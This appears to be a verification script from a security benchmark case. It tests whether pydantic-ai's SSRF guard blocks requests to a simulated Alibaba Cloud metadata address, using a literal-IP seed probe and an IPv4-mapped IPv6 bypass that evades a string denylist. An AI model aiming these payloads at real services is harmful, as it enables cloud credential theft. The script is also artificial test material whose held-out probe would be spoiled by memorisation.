#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0072 pydantic-ai-cve-2026-46678
# (seed CVE-2026-25580 -> residual CVE-2026-46678; SSRF denylist-encoding-gap, CWE-918)
#
# 机制: 静态 ssrf-sidecar canary (模拟阿里云 metadata 100.100.100.200:80, 无宿主端口,
#       仅容器内网可达) 持有 PCB_FLAG 并回显。服务端 GET /fetch?url=... 驱动真实
#       pydantic-ai download_item -> safe_download, 回显下载 body。
#   seed    : url=http://100.100.100.200/
#               v0 (1.55.0, 无 _ssrf.py 守卫)      -> raw client.get -> canary -> FLAG  rc=0
#               v1 (1.56.0, _CLOUD_METADATA_IPS 字符串黑名单) -> ValueError 拦截      rc=10
#   residual: url=http://[::ffff:100.100.100.200]/  (同一 IP 的 IPv4-mapped IPv6)
#               v1 (字符串 miss + allow_local=True 跳过私网检查) -> 双栈内核 v4 路由
#                  到 canary -> FLAG                                                  rc=0
#               v2 (1.99.0, _normalize_ip 解包) -> 拦截                               rc=10
#
# flag 通道: canary 容器内服务端种入 (start.sh 以 RUN_FLAG 注入 PCB_FLAG), 探测不嵌入
#            flag, 效果 = fetched_body 回显 canary 持有的 token -> CANARY 类。
# 判定基准: RUN_FLAG (提交值)。wrong/stale 检查时 RUN_FLAG=override 而容器内仍为
#            start 阶段种入的真 flag -> 通道不含 override -> 判定失败 -> 10 (正确拒绝)。
# 退出码: 0=效果发生(flag 出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态解析该版本服务宿主端口 (compose 固定映射 39570/39571; 平台动态端口亦兼容)
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1 | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "${PORT:-}" ]] || { echo "verify: port resolve failed for $VERSION" >&2; exit 20; }
echo "verify: $VERSION host port = $PORT"

# readiness: GET / 返回 200 即服务就绪 (app.py 根路径回 {"ok":true,...})
READY=""
for _ in $(seq 1 30); do
  CODE="$(curl -sS -m 3 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/" 2>/dev/null || true)"
  if [[ "$CODE" == "200" ]]; then READY=1; break; fi
  sleep 2
done
if [[ -z "$READY" ]]; then echo "verify: service $VERSION not ready on port $PORT" >&2; exit 20; fi

# 构造 candidate (与 poc/original_poc.py 的 seed 语义一致; residual 为 held-out bypass 语义)
"$PY" - "$MODE" <<'PYEOF' > "$WORK_DIR/cand.json"
import json, sys
mode = sys.argv[1]
if mode == "--seed":
    cand = {"probe_id": "cve-2026-25580-literal-metadata-ip", "method": "GET",
            "endpoint": "/fetch", "target_url": "http://100.100.100.200/", "allow_local": True}
else:
    cand = {"probe_id": "cve-2026-46678-ipv4mapped-ipv6-metadata", "method": "GET",
            "endpoint": "/fetch", "target_url": "http://[::ffff:100.100.100.200]/", "allow_local": True}
print(json.dumps(cand))
PYEOF
echo "candidate: $(cat "$WORK_DIR/cand.json")"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 公开执行器 seed_exec.py: 环境 PCB_TARGET_BASE 覆盖其 v1 base 为动态端口
# (v0 base 与 compose 固定映射一致; --residual 只在 v1 上运行)
OUT="$(PCB_TARGET_BASE="http://127.0.0.1:$PORT" "$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "$OUT" >&2; echo "verify: seed_exec failed" >&2; exit 20; }
echo "$OUT" | head -c 400; echo

# 判定: fetch_status=None (HTTP 连接失败) -> 20 环境失败;
#       fetched_body 含 RUN_FLAG (canary 回显的服务端种入 token) -> 0, 否则 10
"$PY" - "$OUT" "$RUN_FLAG" <<'PYEOF'
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    print("BAD-JSON:", sys.argv[1][:200]); sys.exit(20)
flag = sys.argv[2]
print("version=%s fetch_status=%s" % (d.get("version"), d.get("fetch_status")))
body = str(d.get("fetched_body") or "")
print("fetched_body: %s" % body[:300])
if d.get("fetch_status") is None:
    sys.exit(20)
sys.exit(0 if flag in body else 10)
PYEOF
exit $?
